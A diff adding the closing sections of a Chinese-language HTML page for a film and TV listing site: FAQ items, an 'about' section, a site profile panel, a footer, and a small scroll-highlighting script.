+          <summary>字幕能不能关掉或者换语言？</summary>
+          <p>可以。播放页右下角有字幕开关，中英双语可切换，部分小语种片子提供简体中文字幕，没有字幕的条目会在详情页标注清楚。</p>
+        </details>
+        <details>
+          <summary>电视上打开排版会乱吗？</summary>
+          <p>不会。火星影视的页面按屏幕宽度自适应，手机竖屏、平板横屏、电视浏览器都会重新排卡片列数，字体和按钮尺寸也会跟着放大。</p>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="wrap">
+      <div class="head">
+        <div>
+          <span class="eyebrow">ABOUT</span>
+          <h2>关于火星影视</h2>
+          <p>一个只做片单整理的小站，从 2021 年更新到现在。</p>
+        </div>
+        <a class="more" href="#">站点大事记</a>
+      </div>
+      <div class="about">
+        <div>
+          <p><b>火星影视</b>最早是几个人在论坛里互相推荐片子的一个帖子，后来条目越攒越多，才搬到了现在这个地址：https://huoxingyingshi-app.github.io。取名"火星"，是因为我们挑片的标准有点偏——宁可推一部冷门的怪片，也不愿意把榜单塞满同一个模子的爆款。</p>
+          <p>站里每部片子都写了时长、类型和一句"适合什么心情看"的短评，不是复制简介，是看完之后自己写的。榜单每天八点重排，热度来自站内真实的播放、收藏和检索数据，不接受付费插队。</p>
+          <p>页面做得轻，是因为我们自己常用手机竖屏翻片单，讨厌弹窗和自动跳转。如果你也受够了找片半小时、看片十分钟，那就把火星影视存进书签吧。</p>
+        </div>
+        <div class="panel">
+          <h3>站点档案</h3>
+          <dl>
+            <dt>网站名称</dt><dd>火星影视</dd>
+            <dt>网址</dt><dd>https://huoxingyingshi-app.github.io</dd>
+            <dt>建站时间</dt><dd>2021 年 4 月</dd>
+            <dt>内容范围</dt><dd>电影 · 剧集 · 综艺 · 动漫 · 纪录片</dd>
+            <dt>更新时段</dt><dd>每日 08:00（榜单）/ 全天（条目）</dd>
+            <dt>终端支持</dt><dd>手机 · 平板 · 电脑 · 电视浏览器</dd>
+            <dt>内容声明</dt><dd>本站仅做影视信息整理与导航</dd>
+          </dl>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fgrid">
+      <div class="fsite">
+        <a class="brand" href="#"><i class="mark" aria-hidden="true"></i><span><b>火星影视</b></span></a>
+        <p>火星影视 · 影视片单与热度榜单整理站<br>网址：<span class="u">https://huoxingyingshi-app.github.io</span></p>
+        <p>本站只提供影视条目信息与观看导航，各项数据每日更新，仅供参考。</p>
+      </div>
+      <div>
+        <h4>片库</h4>
+        <ul>
+          <li><a href="#">最新电影</a></li>
+          <li><a href="#">热播剧集</a></li>
+          <li><a href="#">综艺盘点</a></li>
+          <li><a href="#">动漫补番</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>工具</h4>
+        <ul>
+          <li><a href="#">热度榜单</a></li>
+          <li><a href="#">片单筛选</a></li>
+          <li><a href="#">追剧进度</a></li>
+          <li><a href="#">缺片补录</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>关于</h4>
+        <ul>
+          <li><a href="#">站点简介</a></li>
+          <li><a href="#">收录标准</a></li>
+          <li><a href="#">意见反馈</a></li>
+          <li><a href="#">内容投诉</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="bottom">
+      <span>&copy; <span id="yr">2026</span> 火星影视 huoxingyingshi-app.github.io · 保留所有权利</span>
+      <span><a href="#">用户协议</a> · <a href="#">隐私说明</a> · <a href="#">回到顶部</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  document.getElementById('yr').textContent = new Date().getFullYear();
+  var links = Array.prototype.slice.call(document.querySelectorAll('.nav a'));
+  var spy = function(){
+    var pos = window.scrollY + 120, cur = null;
+    links.forEach(function(a){
+      var el = document.querySelector(a.getAttribute('href'));
+      if (el && el.offsetTop <= pos) { cur = a; }
+    });
+    links.forEach(function(a){ a.classList.toggle('on', a === cur); });
+  };
+  window.addEventListener('scroll', spy, {passive:true});
+  spy();
+})();
+</script>
+</body>
+</html>
